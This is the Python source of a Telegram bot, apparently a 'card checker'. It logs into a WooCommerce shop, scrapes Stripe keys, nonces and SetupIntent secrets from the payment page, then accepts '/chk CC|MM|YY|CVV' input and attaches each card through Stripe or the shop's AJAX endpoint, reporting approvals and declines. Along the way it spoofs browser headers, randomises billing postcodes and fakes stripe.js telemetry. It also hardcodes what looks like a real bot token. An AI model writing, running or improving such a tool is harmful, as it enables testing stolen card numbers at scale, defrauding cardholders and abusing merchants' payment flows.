import logging
import requests
import re
import json
import datetime
import random
from bs4 import BeautifulSoup
from telegram import Update, ForceReply, ParseMode
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters
import requests.utils # For urlparse

# --- Hardcoded Bot Token ---
BOT_TOKEN = "8153748905:AAGp03pGvNcuL7CAhcOV92jGv2c9opX-BVU" # Replace with your actual bot token

# --- Setup ---
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- MarkdownV2 Escaper ---
def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    if not isinstance(text, str):
        text = str(text)
    # Characters to escape for MarkdownV2: _ * [ ] ( ) ~ ` > # + - = | { } . !
    escape_chars = r'_*[]()~`>#+-=|{}.!'
    return re.sub(f'([{re.escape(escape_chars)}])', r'\\\1', text)

# --- Full Browser Headers (Generalized) ---
def get_general_headers(target_url=None, referer=None):
    # ... (function content as in previous correct version, omitted for brevity) ...
    authority = "example.com"
    if target_url:
        try:
            parsed_url = requests.utils.urlparse(target_url)
            authority = parsed_url.netloc if parsed_url.netloc else authority
        except Exception:
            logger.warning(f"Could not parse target_url {target_url} for authority, using default.")

    effective_referer = referer
    if not effective_referer and target_url:
        try:
            parsed_target_url = requests.utils.urlparse(target_url)
            effective_referer = f"{parsed_target_url.scheme}://{parsed_target_url.netloc}/"
        except Exception:
            effective_referer = "https://google.com"
    elif not effective_referer:
        effective_referer = "https://google.com"

    return {
        "authority": authority,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache", "pragma": "no-cache",
        "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin" if referer and authority in referer else "cross-site",
        "sec-fetch-user": "?1", "upgrade-insecure-requests": "1",
        "referer": effective_referer,
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    }
# --- Login Helper ---
async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Send site login like:\n`https://yoursite\\.com/my-account/|youremail@example\\.com|yourpassword`\n"
        "\\(Ensure the URL is the actual login page URL, and use your email and password\\)",
        parse_mode=ParseMode.MARKDOWN_V2)
    context.user_data['next_action'] = 'handle_login_details'

# --- Login Handler ---
async def handle_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # ... (function content as in previous correct version, omitted for brevity) ...
    if context.user_data.get('next_action') != 'handle_login_details':
        return await route_text_message(update, context, called_from_specific_handler=True)

    if not update.message.text or '|' not in update.message.text or update.message.text.count('|') != 2:
        await update.message.reply_text(
            "Invalid format\\. Send: `https://yoursite\\.com/my-account/|email|pass`",
            parse_mode=ParseMode.MARKDOWN_V2)
        context.user_data.pop('next_action', None)
        return

    full_url, login_identifier, pwd = map(str.strip, update.message.text.split('|', 2))
    session = requests.Session() 

    await update.message.reply_text("Attempting to log in, please wait...")

    try:
        login_page_response = session.get(full_url, headers=get_general_headers(target_url=full_url), timeout=25)
        login_page_response.raise_for_status()
        login_page_text = login_page_response.text
        soup = BeautifulSoup(login_page_text, "html.parser")

        nonce = None
        nonce_selectors = [
            {"name": "woocommerce-login-nonce"}, {"id": "woocommerce-login-nonce"},
            {"name": "_wpnonce"}, {"id": "_wpnonce"}, {"name": "csrf_token"}, {"name": "_token"}
        ]
        for selector in nonce_selectors:
            nonce_input = soup.find("input", selector)
            if nonce_input and nonce_input.get("value"):
                nonce = nonce_input["value"]; logger.info(f"Login Nonce (selector {selector}): {nonce[:10]}..."); break
        if not nonce:
            script_nonce_patterns = [
                r'["\'](?:woocommerce-login-nonce|_wpnonce|csrf_token|_token)["\']\s*:\s*["\']([a-zA-Z0-9]+)["\']',
                r'name=["\'](?:woocommerce-login-nonce|_wpnonce|csrf_token|_token)["\']\svalue=["\']([a-zA-Z0-9]+)["\']'
            ]
            for pattern in script_nonce_patterns:
                script_nonce_match = re.search(pattern, login_page_text)
                if script_nonce_match:
                    nonce = script_nonce_match.group(1); logger.info(f"Login Nonce (regex): {nonce[:10]}..."); break
        if not nonce: logger.warning(f"Login nonce not found on {full_url}.")

        form_action_url = full_url
        login_form = soup.find("form", {"id": "loginform"}) or \
                     soup.find("form", class_=re.compile(r".*(login|signin|account).*form.*", re.I)) or \
                     soup.find("form", action=re.compile(r".*login.*", re.I))

        if login_form and login_form.get("action"):
            form_action_url = requests.utils.urljoin(full_url, login_form.get("action"))
        logger.info(f"Login form action URL: {form_action_url}")

        username_fields = ["log", "username", "email", "user_login", "user[email]", "session[email_or_username]"]
        password_fields = ["pwd", "password", "user_password", "user[password]", "session[password]"]
        data = {"redirect_to": full_url, "testcookie": "1"}

        found_user_field, found_pass_field = False, False
        for u_field in username_fields:
            if soup.find("input", {"name": u_field}): data[u_field] = login_identifier; found_user_field = True; break
        if not found_user_field: data["username"] = login_identifier

        for p_field in password_fields:
            if soup.find("input", {"name": p_field}): data[p_field] = pwd; found_pass_field = True; break
        if not found_pass_field: data["password"] = pwd

        if nonce:
            nonce_input_field = soup.find("input", {"value": nonce})
            if nonce_input_field and nonce_input_field.get("name"): data[nonce_input_field.get("name")] = nonce
            else:
                for n_name in ["woocommerce-login-nonce", "_wpnonce", "csrf_token", "_token", "nonce"]:
                    if soup.find("input", {"name": n_name}): data[n_name] = nonce; break
                else: data["_wpnonce"] = nonce 

        submit_buttons = soup.find_all("button", {"type": "submit"}) + soup.find_all("input", {"type": "submit"})
        for btn in submit_buttons:
            if btn.get("name"): data[btn.get("name")] = btn.get("value", "Log In"); break
        else: data.setdefault("wp-submit", "Log In")

        logger.info(f"Attempting POST to {form_action_url} with data keys: {list(data.keys())}")
        login_response = session.post(form_action_url, data=data, headers=get_general_headers(target_url=form_action_url, referer=full_url), allow_redirects=True, timeout=25)
        login_response.raise_for_status()
        login_response_text_lower = login_response.text.lower()

        login_successful = False
        logout_keywords = ["logout", "log out", "sign out", "sign-out", "customer/account/logout", "wp-login.php?action=logout"]
        dashboard_keywords = ["dashboard", "my account", "order history", "account details", "your profile"]

        if any(keyword in login_response_text_lower for keyword in logout_keywords) or \
           (hasattr(login_response, 'url') and any(keyword in login_response.url.lower() for keyword in (dashboard_keywords + logout_keywords))) or \
           any(keyword in login_response_text_lower for keyword in dashboard_keywords):
            login_successful = True

        error_messages_on_page = ["incorrect username or password", "unknown username", "invalid username", "invalid password", "error", "the password you entered is incorrect", "authentication failed", "too many failed login attempts", "invalid login credentials", "lost your password?"]
        
        if login_successful and any(err_msg in login_response_text_lower for err_msg in error_messages_on_page):
            logger.warning(f"Potential false positive login for {login_identifier}. Checking for login form presence.")
            if soup.find("form", {"id": "loginform"}) or soup.find("form", class_=re.compile(r".*login.*form.*", re.I)) or "user-login" in login_response_text_lower : 
                 login_successful = False
        
        if not login_successful:
             if any(err_msg in login_response_text_lower for err_msg in error_messages_on_page): login_successful = False 
             else: logger.warning(f"Login status ambiguous for {login_identifier}. Assuming failure."); login_successful = False

        if not login_successful:
            error_message_soup = BeautifulSoup(login_response.text, "html.parser")
            error_element = error_message_soup.find(class_=re.compile(r".*(error|alert|message|notice|warning).*", re.I)) or error_message_soup.find(id=re.compile(r".*(error|alert|message|notice|warning).*", re.I))
            error_text = error_element.get_text(strip=True) if error_element else "Login failed. Check credentials/URL."
            await update.message.reply_text(f"Login failed. Site says: {escape_markdown_v2(error_text[:300])}", parse_mode=ParseMode.MARKDOWN_V2)
            logger.info(f"Login failed for {login_identifier}. Final URL: {login_response.url}, Status: {login_response.status_code}")
            context.user_data.pop('next_action', None); return

        context.user_data['session'] = session
        parsed_login_url = requests.utils.urlparse(login_response.url) 
        context.user_data['base_url'] = f"{parsed_login_url.scheme}://{parsed_login_url.netloc}"
        context.user_data['current_site_url'] = login_response.url
        context.user_data['login_identifier'] = login_identifier 

        context.user_data['next_action'] = 'handle_payment_url'
        await update.message.reply_text(
            "Login successful\\! Now send the *exact* URL of the 'Add Payment Method' page "
            "\\(or checkout page where Stripe form is present\\):",
            parse_mode=ParseMode.MARKDOWN_V2)

    except requests.exceptions.HTTPError as e:
        err_msg_text = f"HTTP Error during login: {e.response.status_code} - {e}."
        if hasattr(e.response, 'text') and e.response.text: err_msg_text += f"\nResponse: {e.response.text[:200]}"
        await update.message.reply_text(escape_markdown_v2(err_msg_text), parse_mode=ParseMode.MARKDOWN_V2)
    except requests.exceptions.Timeout: await update.message.reply_text(f"The request timed out while trying to log in to {escape_markdown_v2(full_url)}\\.", parse_mode=ParseMode.MARKDOWN_V2)
    except requests.exceptions.RequestException as e: await update.message.reply_text(f"Network error during login: {escape_markdown_v2(str(e))}", parse_mode=ParseMode.MARKDOWN_V2)
    except Exception as e: logger.exception(f"Unexpected error (login {full_url})"); await update.message.reply_text(f"An unexpected error: {escape_markdown_v2(str(e))}", parse_mode=ParseMode.MARKDOWN_V2)
    finally:
        if not context.user_data.get('session'): context.user_data.pop('next_action', None)


# --- Payment Page Handler ---
async def handle_add_payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # ... (function content as in previous correct version, with careful escaping for reply_parts, omitted for brevity) ...
    if context.user_data.get('next_action') != 'handle_payment_url':
        return await route_text_message(update, context, called_from_specific_handler=True)

    payment_page_url = update.message.text.strip()
    if not payment_page_url.lower().startswith("http"):
        await update.message.reply_text("Invalid URL\\. Please send a full URL \\(e\\.g\\., https://\\.\\.\\.\\)\\.", parse_mode=ParseMode.MARKDOWN_V2)
        return

    session = context.user_data.get("session")
    base_url = context.user_data.get("base_url")
    if not session or not base_url:
        await update.message.reply_text("Login session or base URL missing\\. Please /addsitelogin first\\.", parse_mode=ParseMode.MARKDOWN_V2)
        context.user_data.pop('next_action', None); return

    await update.message.reply_text("Fetching payment page details, please wait...")
    current_site_url_for_referer = context.user_data.get('current_site_url', payment_page_url)

    try:
        page_response = session.get(payment_page_url, headers=get_general_headers(target_url=payment_page_url, referer=current_site_url_for_referer), timeout=20)
        page_response.raise_for_status()
        page_content = page_response.text
        context.user_data['current_site_url'] = page_response.url 
        parsed_payment_page_url = requests.utils.urlparse(page_response.url)
        context.user_data['base_url'] = f"{parsed_payment_page_url.scheme}://{parsed_payment_page_url.netloc}"

    except Exception as e:
        logger.error(f"Failed to fetch payment page {payment_page_url}: {e}")
        await update.message.reply_text(f"Failed to fetch payment page: {escape_markdown_v2(str(e))}", parse_mode=ParseMode.MARKDOWN_V2); return

    stripe_pk, stripe_client_secret, wc_ajax_nonce, api_type = None, None, None, None
    wc_true_ajax_url = None
    
    pk_patterns = [
        r"Stripe\s*\(\s*['\"](pk_(?:live|test)_[a-zA-Z0-9]+)['\"]\s*\)",
        r"""['"](pk_(?:live|test)_[a-zA-Z0-9]+)['"]""",
        r"""\b(pk_(?:live|test)_[a-zA-Z0-9]{20,})\b"""
    ]
    for pattern in pk_patterns:
        match = re.search(pattern, page_content)
        if match: stripe_pk = match.group(1); logger.info(f"Stripe PK found: {stripe_pk[:12]}..."); break
    if not stripe_pk: logger.warning(f"Stripe PK not found.")

    soup_payment_page = BeautifulSoup(page_content, "html.parser")
    wc_script_tag = soup_payment_page.find('script', {'id': 'wc-stripe-upe-classic-js-extra'})
    if wc_script_tag and wc_script_tag.string:
        nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([a-zA-Z0-9]+)"', wc_script_tag.string)
        if nonce_match:
            wc_ajax_nonce = nonce_match.group(1)
            api_type = "setup_intent"
            current_base_url = context.user_data.get("base_url", "") 
            if current_base_url:
                wc_true_ajax_url = f"{current_base_url}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
                logger.info(f"WooCommerce AJAX Nonce found: {wc_ajax_nonce}. AJAX URL set to: {wc_true_ajax_url}")
            else: logger.warning("WC AJAX Nonce found, but base_url missing for AJAX URL.")
    
    si_secret_pattern = r"""['"]?(seti_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+)['"]?"""
    si_match = re.search(si_secret_pattern, page_content)
    if si_match:
        stripe_client_secret = si_match.group(1)
        if not api_type : api_type = "setup_intent"
        logger.info(f"Stripe SetupIntent client_secret (regex): {stripe_client_secret[:15]}...")
    else:
        secret_element = soup_payment_page.find(attrs={"data-client-secret": re.compile(r"seti_.*_secret_.*")})
        if secret_element and secret_element.get("data-client-secret", "").startswith("seti_"):
            stripe_client_secret = secret_element["data-client-secret"]
            if not api_type : api_type = "setup_intent"
            logger.info(f"Stripe SetupIntent client_secret (data-attr): {stripe_client_secret[:15]}...")
        else:
            for script_tag in soup_payment_page.find_all("script"):
                if script_tag.string:
                    si_script_match = re.search(si_secret_pattern, script_tag.string)
                    if si_script_match:
                        stripe_client_secret = si_script_match.group(1)
                        if not api_type : api_type = "setup_intent"
                        logger.info(f"Stripe SetupIntent client_secret (script): {stripe_client_secret[:15]}..."); break
    
    if not stripe_client_secret and wc_ajax_nonce: logger.warning("WC AJAX Nonce found, but no SI client_secret. Direct API fallback impossible.")
    elif not stripe_client_secret and not wc_ajax_nonce: logger.warning(f"Neither WC AJAX Nonce nor Stripe SI client_secret found.")

    if not api_type: 
        if stripe_pk and any(js in page_content.lower() for js in ["stripe.js", "js.stripe.com/v3", "stripe.elements"]):
            api_type = "payment_method"; logger.info("Generic Stripe page detected.")
        else: api_type = "unknown"; logger.warning(f"Could not determine Stripe API type.")

    context.user_data.update({
        'stripe_pk': stripe_pk, 'stripe_type': api_type,
        'stripe_client_secret': stripe_client_secret,
        'wc_ajax_nonce': wc_ajax_nonce, 'wc_true_ajax_url': wc_true_ajax_url,
        'payment_page_url': payment_page_url
    })
    
    escaped_payment_page_url = escape_markdown_v2(payment_page_url)
    reply_parts = [f"Stripe Info Updated for `{escaped_payment_page_url}`:",
                   f"PK: `{escape_markdown_v2(stripe_pk) if stripe_pk else 'Not Found'}`",
                   f"Detected Type: `{escape_markdown_v2(api_type)}`"]
    if wc_ajax_nonce: reply_parts.append(f"WooCommerce AJAX Nonce: `{escape_markdown_v2(wc_ajax_nonce)}`")
    if wc_true_ajax_url: reply_parts.append(f"WooCommerce AJAX URL: `{escape_markdown_v2(wc_true_ajax_url)}`") # URL itself is usually fine
    if stripe_client_secret: reply_parts.append(f"SetupIntent Client Secret: `{escape_markdown_v2(stripe_client_secret[:15])}\\.\\.\\.`") # Escape the literal ...
    
    if api_type != "setup_intent": reply_parts.append("\nWARNING: Page may not be a Stripe SetupIntent page suitable for /chk\\.")
    elif not stripe_pk: reply_parts.append("\nWARNING: Stripe PK not found\\. Cannot proceed with /chk\\.")
    elif not (wc_ajax_nonce and wc_true_ajax_url) and not stripe_client_secret: 
        reply_parts.append("\nWARNING: Critical info for SetupIntent missing \\(Need WC AJAX details or Stripe Client Secret\\)\\. Cannot proceed with /chk\\.")

    await update.message.reply_text("\n".join(reply_parts), parse_mode=ParseMode.MARKDOWN_V2)
    context.user_data['next_action'] = 'awaiting_chk_command'

# --- Card Processing (chk) ---
async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        card_details_str = "" 
        if not update.message.text: await update.message.reply_text("Provide card details: /chk CC|MM|YY|CVV"); return
        command_text_to_check = update.message.text.strip()
        if command_text_to_check.lower().startswith("/chk "): card_details_str = command_text_to_check[len("/chk "):].strip()
        elif '|' in command_text_to_check and command_text_to_check.count('|') == 3 and context.user_data.get('next_action') == 'awaiting_chk_command': card_details_str = command_text_to_check
        else: await update.message.reply_text("Invalid /chk format. Send: /chk CC|MM|YY|CVV"); return
        if not card_details_str or card_details_str.count('|') != 3: await update.message.reply_text("Invalid card format: CC|MM|YY|CVV"); return
        cc, mm_str, yy_raw, cvv_str = map(str.strip, card_details_str.split('|'))
        exp_year_str = f"20{yy_raw}" if len(yy_raw) == 2 else yy_raw
        current_year = datetime.date.today().year
        if not (cc.isdigit() and 13 <= len(cc) <= 19 and mm_str.isdigit() and 1 <= int(mm_str) <= 12 and exp_year_str.isdigit() and len(exp_year_str) == 4 and int(exp_year_str) >= current_year and cvv_str.isdigit() and 3 <= len(cvv_str) <= 4):
            await update.message.reply_text("Invalid card details. Please check and try again."); return

        stripe_pk = context.user_data.get("stripe_pk")
        stripe_type = context.user_data.get("stripe_type")
        stripe_client_secret = context.user_data.get("stripe_client_secret")
        wc_ajax_nonce = context.user_data.get("wc_ajax_nonce")
        wc_true_ajax_url = context.user_data.get("wc_true_ajax_url")
        payment_page_url = context.user_data.get("payment_page_url", "https://example.com")
        session = context.user_data.get("session")
        user_email = context.user_data.get("login_identifier")

        if stripe_type != "setup_intent":
            await update.message.reply_text(f"This bot is for Stripe SetupIntents. Detected type: '{escape_markdown_v2(stripe_type or 'Unknown')}'\\.", parse_mode=ParseMode.MARKDOWN_V2); return
        if not stripe_pk: await update.message.reply_text("Stripe PK missing. Re-scan page."); return
        if not session: await update.message.reply_text("User session lost. Please /addsitelogin again."); return
        if not (wc_ajax_nonce and wc_true_ajax_url) and not stripe_client_secret:
            await update.message.reply_text("Cannot confirm: Missing WC AJAX details & Stripe Client Secret. Re-scan page."); return

        await update.message.reply_text("Creating PaymentMethod with Stripe...")
        pm_creation_headers = {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded", "Authorization": f"Bearer {stripe_pk}", "User-Agent": get_general_headers()["user-agent"]}
        pm_common_data = {"type": "card", "card[number]": cc, "card[cvc]": cvv_str, "card[exp_month]": mm_str, "card[exp_year]": exp_year_str, "billing_details[address][postal_code]": str(random.randint(10000, 99999)), "guid": "NA", "muid": "NA", "sid": "NA", "payment_user_agent": f"stripe.js/{context.bot_data.get('stripe_js_version', 'v3_bot_custom')}", "time_on_page": str(context.bot_data.get('time_on_page', random.randint(10000,20000)))}
        
        pm_creation_response = requests.post("https://api.stripe.com/v1/payment_methods", headers=pm_creation_headers, data=pm_common_data, timeout=30)

        if pm_creation_response.status_code >= 400:
            try: pm_err_json = pm_creation_response.json(); err_detail = pm_err_json.get('error',{}).get('message', 'PM creation failed.')
            except json.JSONDecodeError: err_detail = f"PM creation HTTP {pm_creation_response.status_code}"
            await update.message.reply_text(f"Error creating PM: {escape_markdown_v2(err_detail)}", parse_mode=ParseMode.MARKDOWN_V2); return
        
        created_pm_json = pm_creation_response.json(); created_pm_id = created_pm_json.get("id")
        if not created_pm_id: await update.message.reply_text("PM created but no ID found."); return
        await update.message.reply_text(f"PaymentMethod `{created_pm_id}` created\\.", parse_mode=ParseMode.MARKDOWN_V2)

        confirmation_response, confirmation_method_used = None, None

        if wc_ajax_nonce and wc_true_ajax_url:
            confirmation_method_used = "WooCommerce AJAX"
            await update.message.reply_text(f"Attempting SetupIntent via {escape_markdown_v2(confirmation_method_used)} ({escape_markdown_v2(wc_true_ajax_url)})...", parse_mode=ParseMode.MARKDOWN_V2) # URLs generally don't need escaping unless they have () etc.
            wc_ajax_headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept': '*/*', 'X-Requested-With': 'XMLHttpRequest', 'Referer': payment_page_url, 'User-Agent': get_general_headers()["user-agent"], 'Origin': requests.utils.urlparse(payment_page_url).scheme + "://" + requests.utils.urlparse(payment_page_url).netloc}
            wc_ajax_payload = {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': created_pm_id, 'wc-stripe-payment-type': 'card', '_ajax_nonce': wc_ajax_nonce}
            if user_email: wc_ajax_payload['email'] = user_email # Some plugins might need the email
            logger.info(f"POSTing to WC AJAX ({wc_true_ajax_url}) with Nonce: {wc_ajax_nonce}, PM: {created_pm_id}, PayloadKeys: {list(wc_ajax_payload.keys())}")
            confirmation_response = session.post(wc_true_ajax_url, data=wc_ajax_payload, headers=wc_ajax_headers, timeout=30)
        elif stripe_client_secret:
            confirmation_method_used = "Direct Stripe API"
            await update.message.reply_text(f"Attempting SetupIntent via {escape_markdown_v2(confirmation_method_used)}...")
            intent_id = stripe_client_secret.split('_secret_')[0]
            direct_confirm_url = f"https://api.stripe.com/v1/setup_intents/{intent_id}/confirm"
            direct_confirm_payload = {"payment_method": created_pm_id, "client_secret": stripe_client_secret}
            direct_confirm_headers = {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded", "Authorization": f"Bearer {stripe_pk}", "User-Agent": get_general_headers()["user-agent"]}
            logger.info(f"POSTing to Direct Stripe API: {direct_confirm_url} with PM {created_pm_id}")
            confirmation_response = requests.post(direct_confirm_url, headers=direct_confirm_headers, data=direct_confirm_payload, timeout=30)
        else: await update.message.reply_text("Cannot confirm: No valid method details."); return

        if confirmation_response is not None:
            status_code = confirmation_response.status_code
            result_json_data, raw_text_response = {}, confirmation_response.text
            result_message = f"Result from {escape_markdown_v2(confirmation_method_used)} \\(HTTP {status_code}\\):\n"
            json_decode_error_occurred = False
            try: result_json_data = confirmation_response.json()
            except json.JSONDecodeError:
                json_decode_error_occurred = True
                result_message += escape_markdown_v2("Response was not valid JSON.")
                logger.error(f"{confirmation_method_used} JSON Decode Error. Status: {status_code}, Text: {raw_text_response[:300]}")
                result_json_data = {"error_source": "json_decode", "message": "Server returned non-JSON response.", "status_code": status_code, "raw_snippet": raw_text_response[:200]}
            
            if confirmation_method_used == "WooCommerce AJAX":
                if json_decode_error_occurred: pass
                elif isinstance(result_json_data, dict):
                    success_url_ind = 'payment-methods' in confirmation_response.url and status_code in [200,301,302]
                    if result_json_data.get('success') is True or success_url_ind:
                        status_wc = escape_markdown_v2(result_json_data.get('data', {}).get('status', 'succeeded (inferred)'))
                        id_wc = escape_markdown_v2(result_json_data.get('data', {}).get('id', 'N/A'))
                        result_message += f"✅ WooCommerce AJAX reports SUCCESS\\.\nIntent ID: `{id_wc}` Status: `{status_wc}`"
                        if success_url_ind: result_message += "\n\\(Redirected to payment methods\\)"
                    elif result_json_data.get('success') is False:
                        err_data = result_json_data.get('data', []); err_txt = "Declined/Error."
                        if isinstance(err_data, list) and err_data and isinstance(err_data[0], dict): err_txt = err_data[0].get('message',"Unknown WC AJAX error.")
                        elif isinstance(err_data, str): err_txt = err_data
                        elif isinstance(err_data, dict): err_txt = err_data.get('message', json.dumps(err_data))
                        result_message += f"❌ WooCommerce AJAX reports FAILURE: {escape_markdown_v2(err_txt)}"
                    else: result_message += escape_markdown_v2("❓ Ambiguous WooCommerce AJAX dictionary response (no 'success' field or redirect).")
                else: 
                    result_message += f"❓ Unexpected non\\-dictionary JSON from WC AJAX \\(Type: {escape_markdown_v2(type(result_json_data))}\\)\\."
                    result_json_data = {"error_source":"unexpected_json_type", "message":"WC AJAX non-dict JSON.","type":str(type(result_json_data)), "value":str(result_json_data)[:100], "raw":raw_text_response[:200]}
            elif confirmation_method_used == "Direct Stripe API":
                if json_decode_error_occurred: pass
                elif isinstance(result_json_data, dict):
                    if 'error' in result_json_data:
                        err = result_json_data['error']; msg_text = err.get('message','Unknown')
                        msg = f"❌ Stripe API Error: {escape_markdown_v2(msg_text)}"
                        if err.get('decline_code'): msg += f"\nDecline: `{escape_markdown_v2(err.get('decline_code'))}`"
                        if err.get('setup_intent') and isinstance(err.get('setup_intent'),dict):
                            si_e=err['setup_intent']; msg+=f"\nIntent: `{escape_markdown_v2(si_e.get('id'))}` Status: `{escape_markdown_v2(si_e.get('status'))}`"
                            if si_e.get('last_setup_error'): msg+=f"\nLast Err: `{escape_markdown_v2(si_e.get('last_setup_error').get('message'))}`"
                        result_message += msg
                    else:
                        item_id, item_status = result_json_data.get('id','N/A'), result_json_data.get('status','N/A')
                        result_message += f"Stripe API Result:\nID: `{escape_markdown_v2(item_id)}`\nStatus: `{escape_markdown_v2(item_status)}`"
                        pm_info=(result_json_data.get('payment_method_details',{}).get('card',{}) or result_json_data.get('payment_method',{}).get('card',{}))
                        if pm_info.get('last4'): result_message+=f"\nCard: {escape_markdown_v2(pm_info.get('brand','N/A').capitalize())} `****{escape_markdown_v2(pm_info['last4'])}` \\({escape_markdown_v2(pm_info.get('funding','N/A'))}\\) \\- {escape_markdown_v2(pm_info.get('country','N/A'))}"
                        s_map={"succeeded":"\n✅ SetupIntent successful\\.","requires_payment_method":"\n❌ Card declined\\.","requires_action":"\n⏳ Needs customer action \\(e\\.g\\., 3DS\\)\\.","processing":"\n⏳ Processing\\."}
                        result_message += s_map.get(item_status, f"\nℹ️ Status: {escape_markdown_v2(item_status)}")
                else: 
                     result_message += f"❓ Unexpected non\\-dictionary JSON from Direct Stripe API \\(Type: {escape_markdown_v2(type(result_json_data))}\\)\\."
                     result_json_data = {"error_source":"unexpected_json_type_stripe", "message":"Stripe API non-dict JSON.","type":str(type(result_json_data)), "value":str(result_json_data)[:100], "raw":raw_text_response[:200]}
            
            json_dump_str = json.dumps(result_json_data, indent=2, ensure_ascii=False)
            # For the final display, ensure the result_message doesn't have unescaped special chars
            # (it should be okay now as its components are escaped)
            # The json_dump_str goes into a code block, which is fine.
            final_reply_text = f"{result_message}\n\nRaw Confirm Intent Response ({escape_markdown_v2(confirmation_method_used)}):\n```json\n{json_dump_str[:3000]}\n```"
            try:
                await update.message.reply_text(final_reply_text, parse_mode=ParseMode.MARKDOWN_V2)
            except Exception as telegram_err:
                logger.error(f"Telegram send error (MarkdownV2): {telegram_err}. Message causing error: {final_reply_text}")
                # Fallback to sending plain text if MarkdownV2 fails
                plain_error_message = (f"Result from {confirmation_method_used} (HTTP {status_code}):\n"
                                       f"Could not format the full response for Telegram due to special characters. "
                                       f"Please check the bot logs for the raw JSON output if needed.\n"
                                       f"A summary or error might be: {result_message.replace('`', '').replace('*', '').replace('_', '')}") # Basic strip for summary
                await update.message.reply_text(plain_error_message)


        else: await update.message.reply_text("Internal error: Confirmation response object not created.")
    except requests.exceptions.Timeout: await update.message.reply_text("Error: Network request timed out.")
    except requests.exceptions.RequestException as e: await update.message.reply_text(f"Error connecting: {escape_markdown_v2(str(e))}", parse_mode=ParseMode.MARKDOWN_V2)
    except Exception as e: logger.exception("Unhandled error in chk"); await update.message.reply_text(f"An error occurred: {escape_markdown_v2(str(e))}", parse_mode=ParseMode.MARKDOWN_V2)

# --- Text Message Router ---
async def route_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE, called_from_specific_handler=False):
    # ... (function content as in previous correct version, ensure send_md_reply is used, omitted for brevity) ...
    next_action = context.user_data.get('next_action')
    message_text = update.message.text.strip() if update.message and update.message.text else ""
    
    async def send_md_reply(text_mdv2): 
        try: await update.message.reply_text(text_mdv2, parse_mode=ParseMode.MARKDOWN_V2)
        except Exception as e:
            logger.warning(f"MDv2 Error: {e} for text: {text_mdv2}. Sending plain.")
            plain_text = text_mdv2 # Attempt to send as is, hoping Telegram handles it.
            # More aggressive cleaning if needed:
            # plain_text = re.sub(r'[_*`\[\]()~>#+\-=|{}.!]', '', text_mdv2) # Strip all markdown
            await update.message.reply_text(plain_text)


    if called_from_specific_handler:
        if next_action == 'handle_login_details': await send_md_reply("Expecting login: `URL|email|pass`\\.")
        elif next_action == 'handle_payment_url': await send_md_reply("Expecting a payment page URL\\.")
        elif next_action == 'awaiting_chk_command':
            if not (message_text.lower().startswith("/chk ") or ('|' in message_text and message_text.count('|') == 3)):
                 await send_md_reply("Ready for `/chk CC|MM|YY|CVV` or use /addsitelogin to start over\\.")
        else:
            if '|' in message_text and message_text.count('|') == 2: context.user_data['next_action'] = 'handle_login_details'; return await handle_login(update, context)
            await send_md_reply("I'm not sure what to do\\. Try /start or /addsitelogin\\.")
        return

    if next_action == 'handle_login_details': await handle_login(update, context)
    elif next_action == 'handle_payment_url': await handle_add_payment(update, context)
    elif next_action == 'awaiting_chk_command':
        if '|' in message_text and message_text.count('|') == 3 and not message_text.lower().startswith("/chk"): return await chk(update, context)
        elif not message_text.lower().startswith("/chk ") and not ('|' in message_text and message_text.count('|') == 3) : 
            await send_md_reply("Ready for card details `CC|MM|YY|CVV` \\(or use `/chk CC|MM|YY|CVV`\\)\\. Or /addsitelogin to restart\\.")
    else:
        if '|' in message_text and message_text.count('|') == 2: context.user_data['next_action'] = 'handle_login_details'; await handle_login(update, context)
        elif '|' in message_text and message_text.count('|') == 3: await send_md_reply("Please /addsitelogin, then payment page URL, then /chk `CC|MM|YY|CVV`\\.")
        else: await send_md_reply("Unknown command/message\\. Try /start or /addsitelogin\\.")


# --- Main Function ---
def main():
    application = Application.builder().token(BOT_TOKEN).build()
    application.bot_data['stripe_js_version'] = "v3_bot_wc_md_fix_1.7" 
    application.bot_data['time_on_page'] = random.randint(15000, 25000) 

    application.add_handler(CommandHandler("start", addsitelogin))
    application.add_handler(CommandHandler("addsitelogin", addsitelogin))
    application.add_handler(CommandHandler("chk", chk))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), route_text_message))

    logger.info("Bot started polling...")
    application.run_polling()

if __name__ == "__main__":
    main()
